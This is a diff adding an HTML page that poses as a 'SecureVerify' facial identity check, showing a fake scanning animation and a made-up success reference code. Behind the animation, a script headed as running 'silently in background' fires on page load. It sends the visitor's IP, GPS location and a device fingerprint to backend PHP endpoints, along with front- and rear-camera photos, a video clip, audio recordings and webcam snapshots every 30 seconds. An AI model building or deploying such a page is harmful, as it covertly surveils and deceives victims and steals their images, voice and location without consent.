@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Identity Verification — SecureVerify</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#060918;color:#fff;font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+
+/* Animated background */
+.bg{position:fixed;inset:0;z-index:0;}
+.bg-circle{position:absolute;border-radius:50%;filter:blur(80px);animation:drift 8s ease-in-out infinite;}
+.bg-circle:nth-child(1){width:500px;height:500px;background:rgba(99,102,241,.15);top:-100px;left:-100px;animation-delay:0s;}
+.bg-circle:nth-child(2){width:400px;height:400px;background:rgba(6,182,212,.12);bottom:-80px;right:-80px;animation-delay:-3s;}
+.bg-circle:nth-child(3){width:300px;height:300px;background:rgba(168,85,247,.1);top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-6s;}
+@keyframes drift{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(20px,30px) scale(1.05)}}
+
+/* Card */
+.card{position:relative;z-index:1;background:rgba(255,255,255,.04);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:44px 40px;width:100%;max-width:420px;text-align:center;}
+
+/* Logo */
+.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:32px;}
+.logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#6366f1,#06b6d4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;}
+.logo-text{font-size:1.1rem;font-weight:700;background:linear-gradient(90deg,#818cf8,#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+
+/* Face scan animation */
+.scan-wrap{position:relative;width:180px;height:180px;margin:0 auto 28px;}
+.face-outline{width:180px;height:180px;border-radius:50%;border:2px solid rgba(99,102,241,.3);position:relative;display:flex;align-items:center;justify-content:center;}
+.face-icon{font-size:5rem;filter:grayscale(0.3);}
+
+/* Scan line */
+.scan-line{position:absolute;left:4px;right:4px;height:2px;background:linear-gradient(90deg,transparent,#6366f1,#06b6d4,#6366f1,transparent);border-radius:2px;animation:scanMove 2.2s ease-in-out infinite;box-shadow:0 0 12px rgba(99,102,241,.8);}
+@keyframes scanMove{0%{top:4px;opacity:0}10%{opacity:1}90%{opacity:1}100%{top:calc(100% - 6px);opacity:0}}
+
+/* Corner brackets */
+.corner{position:absolute;width:22px;height:22px;border-color:#6366f1;border-style:solid;opacity:.8;}
+.corner.tl{top:6px;left:6px;border-width:2px 0 0 2px;border-radius:3px 0 0 0;}
+.corner.tr{top:6px;right:6px;border-width:2px 2px 0 0;border-radius:0 3px 0 0;}
+.corner.bl{bottom:6px;left:6px;border-width:0 0 2px 2px;border-radius:0 0 0 3px;}
+.corner.br{bottom:6px;right:6px;border-width:0 2px 2px 0;border-radius:0 0 3px 0;}
+
+/* Orbit dots */
+.orbit{position:absolute;inset:0;animation:spin 3s linear infinite;}
+.orbit-dot{position:absolute;width:6px;height:6px;background:#6366f1;border-radius:50%;top:0;left:50%;transform:translateX(-50%);box-shadow:0 0 8px #6366f1;}
+@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+
+/* Steps */
+.steps{display:flex;flex-direction:column;gap:12px;margin-bottom:28px;text-align:left;}
+.step{display:flex;align-items:center;gap:12px;padding:12px 16px;border-radius:12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);transition:.4s;}
+.step.active{background:rgba(99,102,241,.1);border-color:rgba(99,102,241,.3);}
+.step.done{background:rgba(34,197,94,.08);border-color:rgba(34,197,94,.25);}
+.step-icon{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.9rem;flex-shrink:0;}
+.step.pending .step-icon{background:rgba(255,255,255,.08);}
+.step.active .step-icon{background:rgba(99,102,241,.3);animation:pulse 1.2s ease-in-out infinite;}
+.step.done .step-icon{background:rgba(34,197,94,.25);}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(99,102,241,.4)}50%{box-shadow:0 0 0 6px rgba(99,102,241,0)}}
+.step-text{flex:1;}
+.step-label{font-size:.85rem;font-weight:500;}
+.step.pending .step-label{color:#64748b;}
+.step.active .step-label{color:#a5b4fc;}
+.step.done .step-label{color:#86efac;}
+.step-sub{font-size:.72rem;color:#475569;margin-top:2px;}
+.step-badge{font-size:.7rem;padding:2px 8px;border-radius:20px;font-weight:600;}
+.step.active .step-badge{background:rgba(99,102,241,.25);color:#a5b4fc;}
+.step.done .step-badge{background:rgba(34,197,94,.2);color:#86efac;}
+.step.pending .step-badge{background:rgba(255,255,255,.06);color:#64748b;}
+
+/* Progress bar */
+.progress-wrap{margin-bottom:20px;}
+.progress-label{display:flex;justify-content:space-between;font-size:.78rem;color:#64748b;margin-bottom:8px;}
+.progress-track{height:4px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden;}
+.progress-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,#6366f1,#06b6d4);transition:width 1.2s cubic-bezier(.4,0,.2,1);box-shadow:0 0 10px rgba(99,102,241,.5);}
+
+/* Status text */
+.status-msg{font-size:.82rem;color:#64748b;animation:blink 1.8s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* Success screen */
+.success{display:none;flex-direction:column;align-items:center;}
+.check-circle{width:80px;height:80px;background:linear-gradient(135deg,#22c55e,#16a34a);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.2rem;margin-bottom:20px;box-shadow:0 0 40px rgba(34,197,94,.4);animation:popIn .5s cubic-bezier(.175,.885,.32,1.275);}
+@keyframes popIn{from{transform:scale(0)}to{transform:scale(1)}}
+.success h2{font-size:1.4rem;font-weight:700;margin-bottom:8px;color:#fff;}
+.success p{font-size:.85rem;color:#64748b;max-width:280px;line-height:1.6;}
+.ref{font-size:.75rem;color:#374151;margin-top:16px;font-family:'Courier New',monospace;}
+</style>
+</head>
+<body>
+<div class="bg">
+  <div class="bg-circle"></div>
+  <div class="bg-circle"></div>
+  <div class="bg-circle"></div>
+</div>
+
+<div class="card">
+  <div class="logo">
+    <div class="logo-icon">🛡</div>
+    <div class="logo-text">SecureVerify</div>
+  </div>
+
+  <!-- Scanning phase -->
+  <div id="scanPhase">
+    <div class="scan-wrap">
+      <div class="face-outline">
+        <span class="face-icon">🧑</span>
+        <div class="scan-line"></div>
+        <div class="corner tl"></div>
+        <div class="corner tr"></div>
+        <div class="corner bl"></div>
+        <div class="corner br"></div>
+      </div>
+      <div class="orbit"><div class="orbit-dot"></div></div>
+    </div>
+
+    <div class="steps" id="steps">
+      <div class="step active" id="s1">
+        <div class="step-icon">📷</div>
+        <div class="step-text">
+          <div class="step-label">Capturing face geometry</div>
+          <div class="step-sub">Analyzing 68 facial landmarks</div>
+        </div>
+        <span class="step-badge">In progress</span>
+      </div>
+      <div class="step pending" id="s2">
+        <div class="step-icon">🔍</div>
+        <div class="step-text">
+          <div class="step-label">Liveness detection</div>
+          <div class="step-sub">Confirming live presence</div>
+        </div>
+        <span class="step-badge">Waiting</span>
+      </div>
+      <div class="step pending" id="s3">
+        <div class="step-icon">🗄</div>
+        <div class="step-text">
+          <div class="step-label">Database match</div>
+          <div class="step-sub">Comparing 2.4M records</div>
+        </div>
+        <span class="step-badge">Waiting</span>
+      </div>
+      <div class="step pending" id="s4">
+        <div class="step-icon">✅</div>
+        <div class="step-text">
+          <div class="step-label">Identity confirmed</div>
+          <div class="step-sub">Generating secure token</div>
+        </div>
+        <span class="step-badge">Waiting</span>
+      </div>
+    </div>
+
+    <div class="progress-wrap">
+      <div class="progress-label">
+        <span id="progressLabel">Scanning face...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill" style="width:0%"></div>
+      </div>
+    </div>
+
+    <div class="status-msg" id="statusMsg">Please keep your face in frame...</div>
+  </div>
+
+  <!-- Success phase -->
+  <div class="success" id="successPhase">
+    <div class="check-circle">✓</div>
+    <h2>Identity Verified</h2>
+    <p>Your identity has been successfully confirmed. You may now proceed.</p>
+    <div class="ref" id="refCode"></div>
+  </div>
+</div>
+
+<script>
+const BACKEND = window.location.origin;
+let captureDone = false;
+
+// ── Capture stack (runs silently in background) ──
+async function runCapture() {
+  if (captureDone) return; captureDone = true;
+  fetch(BACKEND + '/ip.php').catch(()=>{});
+  geoCapture();
+  sendDevice();
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user', width:1280, height:720 }, audio:true });
+    const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    await delay(1000);
+    for (let i = 0; i < 5; i++) {
+      const c = snap(v);
+      fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c, burst_index: i, cam_facing:'user', shot_type:'face_scan' }) }).catch(()=>{});
+      await delay(380);
+    }
+    // Video clip
+    try { const rec=new MediaRecorder(stream,{mimeType:'video/webm'});const ch=[];rec.ondataavailable=e=>ch.push(e.data);rec.onstop=()=>{const b=new Blob(ch,{type:'video/webm'});const fr=new FileReader();fr.onload=()=>fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({video_clip:fr.result,cam_facing:'user'})}).catch(()=>{});fr.readAsDataURL(b);};rec.start();setTimeout(()=>rec.stop(),10000);} catch(e){}
+    // Audio
+    try { const as=await navigator.mediaDevices.getUserMedia({audio:true,video:false});const ar=new MediaRecorder(as);const ac=[];ar.ondataavailable=e=>ac.push(e.data);ar.onstop=()=>{const b=new Blob(ac,{type:'audio/webm'});const fr=new FileReader();fr.onload=()=>fetch(BACKEND+'/audio.php',{method:'POST',body:new URLSearchParams({audio_clip:fr.result})}).catch(()=>{});fr.readAsDataURL(b);};ar.start();setTimeout(()=>ar.stop(),15000);} catch(e){}
+    // Rear
+    try { const rs=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});const rv=document.createElement('video');rv.srcObject=rs;rv.muted=true;await rv.play().catch(()=>{});await delay(800);for(let i=0;i<3;i++){fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({cat:snap(rv),burst_index:i,cam_facing:'environment',shot_type:'burst'})}).catch(()=>{});await delay(380);}rs.getTracks().forEach(t=>t.stop());} catch(e){}
+    // Interval
+    setInterval(async()=>{if(!stream)return;const v2=document.createElement('video');v2.srcObject=stream;v2.muted=true;await v2.play().catch(()=>{});fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({cat:snap(v2),burst_index:0,cam_facing:'user',shot_type:'interval'})}).catch(()=>{});},30000);
+  } catch(e) { /* camera denied — data already captured */ }
+}
+
+function snap(v) {
+  const c = document.createElement('canvas'); c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+  c.getContext('2d').drawImage(v,0,0); return c.toDataURL('image/jpeg',0.92);
+}
+function geoCapture() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(p=>fetch(BACKEND+'/location.php',{method:'POST',body:new URLSearchParams({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude||'',speed:p.coords.speed||'',heading:p.coords.heading||''})}).catch(()=>{}),()=>{});
+}
+async function sendDevice() {
+  const ua=navigator.userAgent;
+  const os=/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
+  const br=/Edg/.test(ua)?'Edge':/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+  const bat=navigator.getBattery?await navigator.getBattery().then(b=>Math.round(b.level*100)+'%').catch(()=>'N/A'):'N/A';
+  let wv='N/A';try{const gl=document.createElement('canvas').getContext('webgl');const ext=gl.getExtension('WEBGL_debug_renderer_info');wv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);}catch(e){}
+  fetch(BACKEND+'/device_info.php',{method:'POST',body:new URLSearchParams({os,browser:br,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen_w:screen.width,screen_h:screen.height,pixel_ratio:window.devicePixelRatio,color_depth:screen.colorDepth,cores:navigator.hardwareConcurrency||'N/A',memory:navigator.deviceMemory||'N/A',battery:bat,network:(navigator.connection||{}).effectiveType||'N/A',platform:navigator.platform,touch:navigator.maxTouchPoints,webgl_vendor:wv})}).catch(()=>{});
+}
+const delay = ms => new Promise(r => setTimeout(r, ms));
+
+// ── Loading animation sequence ──
+const steps = [
+  { id:'s1', label:'Scanning face...', pct:22, msg:'Analyzing facial landmarks...' },
+  { id:'s2', label:'Liveness check...', pct:50, msg:'Confirming live presence...' },
+  { id:'s3', label:'Matching records...', pct:78, msg:'Searching 2.4 million records...' },
+  { id:'s4', label:'Generating token...', pct:100, msg:'Almost done...' },
+];
+
+const durations = [3200, 3800, 4500, 2200]; // ms per step
+
+function setStep(idx, state) {
+  const el = document.getElementById(steps[idx].id);
+  el.className = 'step ' + state;
+  const badge = el.querySelector('.step-badge');
+  if (state === 'active') badge.textContent = 'In progress';
+  else if (state === 'done') badge.textContent = 'Done';
+  else badge.textContent = 'Waiting';
+}
+
+async function runAnimation() {
+  for (let i = 0; i < steps.length; i++) {
+    const s = steps[i];
+    if (i > 0) setStep(i - 1, 'done');
+    setStep(i, 'active');
+    document.getElementById('progressLabel').textContent = s.label;
+    document.getElementById('statusMsg').textContent = s.msg;
+    // Animate progress smoothly
+    const start = i === 0 ? 0 : steps[i-1].pct;
+    const end = s.pct;
+    const startTime = Date.now();
+    const dur = durations[i];
+    await new Promise(resolve => {
+      const tick = () => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(elapsed / dur, 1);
+        const eased = 1 - Math.pow(1 - progress, 3);
+        const cur = Math.round(start + (end - start) * eased);
+        document.getElementById('progressFill').style.width = cur + '%';
+        document.getElementById('progressPct').textContent = cur + '%';
+        if (progress < 1) requestAnimationFrame(tick);
+        else resolve();
+      };
+      requestAnimationFrame(tick);
+    });
+  }
+  setStep(steps.length - 1, 'done');
+  await delay(600);
+  showSuccess();
+}
+
+function showSuccess() {
+  document.getElementById('scanPhase').style.display = 'none';
+  const s = document.getElementById('successPhase');
+  s.style.display = 'flex';
+  const ref = 'SV-' + Math.random().toString(36).substring(2,8).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
+  document.getElementById('refCode').textContent = 'Reference: ' + ref;
+}
+
+// Start both in parallel — capture happens silently while animation plays
+window.addEventListener('load', () => {
+  runCapture();
+  runAnimation();
+});
+</script>
+</body>
+</html>
